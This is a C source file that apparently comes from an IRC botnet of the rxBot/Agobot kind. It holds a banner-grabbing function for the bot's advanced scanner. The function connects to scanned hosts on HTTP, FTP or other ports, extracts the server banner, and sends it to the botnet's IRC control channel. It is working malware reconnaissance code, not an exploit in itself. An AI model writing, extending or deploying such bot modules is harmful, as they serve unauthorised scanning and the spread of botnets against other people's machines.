#include "includes.h"
#include "functions.h"
#ifndef NO_ADVSCAN
BOOL banner(char *target, void* conn,EXINFO exinfo)
{
	IRC* irc=(IRC*)conn;

	SOCKET cSocket;
	SOCKADDR_IN cAddr;
	if ((cSocket=fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP))==INVALID_SOCKET)
		return FALSE;

	cAddr.sin_family = AF_INET;
	cAddr.sin_port = fhtons(exinfo.port);
	cAddr.sin_addr.s_addr = finet_addr(exinfo.ip);
	if (fconnect(cSocket,(SOCKADDR *)&cAddr,sizeof(cAddr))==SOCKET_ERROR)
	{
		fclosesocket(cSocket);
		return FALSE;
	}

	char sBuffer[512];
	if (exinfo.port==80)
		_snprintf(sBuffer,sizeof(sBuffer),"GET / HTTP/1.1\r\nHost: %s\r\n\r\n",exinfo.ip);
	else
		_snprintf(sBuffer,sizeof(sBuffer),"\r\n");
	fsend(cSocket,sBuffer,strlen(sBuffer),0);

	char *check,*sBanner=NULL;
	char inBuffer[1024],paBuffer[1024];
	ZeroMemory(inBuffer,sizeof(inBuffer));
	ZeroMemory(paBuffer,sizeof(paBuffer));
	if (frecv(cSocket, inBuffer, sizeof(inBuffer), 0) <= 0)
	{
		fclosesocket(cSocket);		// Close the socket
	}
	else
	{
		//Server: Apache/2.0.52 (Win32) mod_ssl/2.0.52 OpenSSL/0.9.7e PHP/5.0.3
		//220---------- Welcome to Pure-FTPd [TLS] ----------
		
		unsigned int b=0,r=0;
		// b=Current character for inBuffer
		// r=Current character for paBuffer
		for (b=0,r=strlen(paBuffer); b<strlen(inBuffer); b++,r++)
		{
			if (inBuffer[b] != '\n' && inBuffer[b] != '\r') // If its not a newline character
				paBuffer[r] = inBuffer[b];					// Append the character to the parse buf
			else
				r--;										// Subtract r since it got added for a newline
															// (Not sure if this is still needed)
			if (inBuffer[b] == '\n')
			{
				if (exinfo.port==80)
				{
					check=strstr(paBuffer,"Server: ");//httpd
					if (check)
					{
						sBanner=substr(paBuffer,8,strlen(paBuffer));//get rid of the Server: 
						break;
					}
				}
				else if (exinfo.port==21)
				{
					check=strstr(paBuffer,"220");//ftp
					if (check)
					{
						sBanner=substr(paBuffer,4,strlen(paBuffer));//get rid of the 220 
						break;
					}
				}
				else
				{
					if (strcmp(paBuffer,""))
					{
						sBanner=paBuffer;
						break;
					}
				}

				ZeroMemory(paBuffer,sizeof(paBuffer));
				r=-1;
			}
		}
	}//recv
	fclosesocket(cSocket);

	if (sBanner)
		irc->privmsg(target,"%s Banner: %s:%i: %s",scan_title,exinfo.ip,exinfo.port,sBanner);
	else
		return FALSE;

	return TRUE;
}
#endif